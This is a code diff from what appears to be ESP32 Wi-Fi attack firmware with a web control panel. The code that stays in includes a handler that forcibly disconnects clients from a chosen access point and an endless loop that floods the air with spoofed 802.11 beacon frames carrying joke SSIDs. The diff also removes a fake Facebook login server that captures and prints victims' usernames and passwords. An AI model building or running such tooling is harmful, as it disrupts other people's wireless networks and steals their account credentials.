@@ -4,12 +4,9 @@
 #include "socket.h"
 #include "http_response.h"
 #include "http_request.h"
+#include "html_pages.h"
 
 static wifictl_ap_records_t ap_records = {0};
-
-void handle_root(int client_sock) {
-    http_send_root_page(client_sock);
-}
 
 void handle_scan(int client_sock) {
     int err = scan_networks(&ap_records);
@@ -19,7 +16,7 @@ void handle_scan(int client_sock) {
         return;
     }
     char* records = records_to_json(&ap_records);
-    err = http_send_json_response(client_sock, records);
+    http_send_json_response(client_sock, records);
     free(records);
 }
 
@@ -33,10 +30,9 @@ void handle_attack(http_request_t* req, int client_sock) {
     }
     uint8_t bytes_bssid[6];
     ret = bssid_string_to_bytes(bssid, bytes_bssid);
-    if(ret != 0)
-    {
+    if(ret != 0) {
         ESP_LOGE("WebServer", "Failed to convert BSSID string to bytes");
-        http_send_not_found_response(client_sock);
+        http_send_error_response(client_sock);
         return;
     }
     wifi_ap_record_t* record = get_ap_record_by_bssid(&ap_records, bytes_bssid);
@@ -46,39 +42,44 @@ void handle_attack(http_request_t* req, int client_sock) {
         http_send_not_found_response(client_sock);
         return;
     }
-    ret = disconnect(record, 10);
+    http_send_ok_response(client_sock);
+    ret = wifi_disconnect(record, 10);
     if (ret != ESP_OK) {
         ESP_LOGE("WebServer", "BSSID not found");
         http_send_not_found_response(client_sock);
         return;
     }
-    http_send_ok_response(client_sock);
 }
 
 void handle_flood(http_request_t* req, int client_sock){
-    uint8_t line = 0;
+    uint8_t line_index = 0;
     uint8_t beacon_rick[200];
     uint16_t seq[TOTAL_LINES] = { 0 };
     while(1){
         vTaskDelay(100 / TOTAL_LINES / portTICK_PERIOD_MS);
+
         memcpy(beacon_rick, beacon_frame, BEACON_SSID_OFFSET - 1);
-        beacon_rick[BEACON_SSID_OFFSET - 1] = strlen(rick_ssids[line]);
-        memcpy(&beacon_rick[BEACON_SSID_OFFSET], rick_ssids[line], strlen(rick_ssids[0]));
-        memcpy(&beacon_rick[BEACON_SSID_OFFSET + strlen(rick_ssids[line])], &beacon_frame[BEACON_SSID_OFFSET], sizeof(beacon_frame) - BEACON_SSID_OFFSET);
-        beacon_rick[SRCADDR_OFFSET + 5] = line;
-        beacon_rick[BSSID_OFFSET + 5] = line;
 
-        beacon_rick[SEQNUM_OFFSET] = (seq[line] & 0x0f) << 4;
-		beacon_rick[SEQNUM_OFFSET + 1] = (seq[line] & 0xff0) >> 4;
-        seq[line]++;
+        uint8_t ssid_len = strlen(rick_ssids[line_index]);
+        char* ssid = rick_ssids[line_index];
 
-        if (seq[line] > 0xfff)
-        seq[line] = 0;
+        beacon_rick[BEACON_SSID_OFFSET - 1] = strlen(rick_ssids[line_index]);
+        memcpy(&beacon_rick[BEACON_SSID_OFFSET], rick_ssids[line_index], strlen(rick_ssids[0]));
+        memcpy(&beacon_rick[BEACON_SSID_OFFSET + strlen(rick_ssids[line_index])], &beacon_frame[BEACON_SSID_OFFSET], sizeof(beacon_frame) - BEACON_SSID_OFFSET);
+        beacon_rick[SRCADDR_OFFSET + 5] = line_index;
+        beacon_rick[BSSID_OFFSET + 5] = line_index;
+
+        beacon_rick[SEQNUM_OFFSET] = (seq[line_index] & 0x0f) << 4;
+		beacon_rick[SEQNUM_OFFSET + 1] = (seq[line_index] & 0xff0) >> 4;
+        seq[line_index]++;
+
+        if (seq[line_index] > 0xfff)
+        seq[line_index] = 0;
 
         esp_wifi_80211_tx(WIFI_IF_AP, beacon_rick, sizeof(beacon_frame) + strlen(rick_ssids[0]), false);
         
-        if (++line >= TOTAL_LINES)
-			line = 0;
+        if (++line_index >= TOTAL_LINES)
+			line_index = 0;
     }
 }
 
@@ -91,7 +92,7 @@ void handle_connection(http_request_t* req, int client_sock) {
 
     if (strcmp(req->url, "/") == 0) {
         ESP_LOGI("WebServer", "Handling root request");
-        handle_root(client_sock);
+        http_send_html_response(client_sock, root_page_html);
     } else if (strcmp(req->url, "/scan") == 0) {
         ESP_LOGI("WebServer", "Handling scan request");
         handle_scan(client_sock);
@@ -158,87 +159,6 @@ void start_webserver(){
     }
 }
 
-void http_send_facebook_page(int client_sock) {
-    char response[128];
-    snprintf(response, sizeof(response), "HTTP/1.1 200 OK\r\n"
-                                        "Content-Type: text/html\r\n"
-                                        "Content-Length: %zu\r\n"
-                                        "\r\n", strlen(facebook_login_page_html));
-    socket_send(client_sock, response, strlen(response));
-    socket_send(client_sock, facebook_login_page_html, strlen(facebook_login_page_html));
-}
 
-void handle_facebook_connection(http_request_t* req, int client_sock) {
-    if(strcmp(req->method, "GET") == 0){
-        ESP_LOGI("FacebookWebServer", "Handling GET request");
-        http_send_facebook_page(client_sock);
-    }
-    else if(strcmp(req->method, "POST") == 0) {
-        ESP_LOGI("FacebookWebServer", "Handling POST request");
-        printf("BODY: %s\n", req->body);
-        char username[128];
-        char password[128];
-        int ret = extract_form_field_to_buffer(req->body, "username", username, 128);
-        ret = extract_form_field_to_buffer(req->body, "password", password, 128);
-        printf("Username: %s\n", username);
-        printf("Password: %s\n", password);
-
-        http_send_ok_response(client_sock);
-    } else {
-        ESP_LOGI("FacebookWebServer", "Handling not found request");
-        http_send_not_found_response(client_sock);
-    }
-}
-
-void serve_facebook_page(){
-    ESP_LOGI("FacebookWebServer", "Creating socket...");
-    int sock = socket_create(IPv4, Stream);
-    if (sock < 0) {
-        ESP_LOGE("FacebookWebServer", "Failed to create socket");
-        return;
-    }
-
-    socket_set_reuse_addr_option(sock);
-
-    ESP_LOGI("FacebookWebServer", "Binding socket...");
-    if (socket_bind(sock, IPv4, 80, INADDR_ANY) < 0) {
-        ESP_LOGE("FacebookWebServer", "Failed to bind socket");
-        close(sock);
-        return;
-    }
-
-    if (socket_listen(sock, 5) < 0) {
-        ESP_LOGE("FacebookWebServer", "Failed to listen on socket");
-        close(sock);
-        return;
-    }
-    ESP_LOGI("FacebookWebServer", "Web server started on port 80");
-
-    while (1) {
-        int client_sock = socket_accept(sock);
-        if (client_sock < 0) {
-            ESP_LOGE("FacebookWebServer", "Failed to accept connection");
-            continue;
-        }
-        ESP_LOGI("FacebookWebServer", "Connection accepted...");
-
-        char buffer[1024];
-        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
-        if (len < 0) {
-            ESP_LOGE("FacebookWebServer", "Failed to receive data");
-            close(client_sock);
-            continue;
-        }
-        buffer[len] = 0;
-        
-        http_request_t req = http_request_parse(buffer);
-        printf("Facebook Request Method: %s\n", req.method);
-        printf("Facebook Request URL: %s\n", req.url);
-
-        handle_facebook_connection(&req, client_sock);
-
-        close(client_sock);
-    }
-}
 
 #endif // WEBSERVER_H
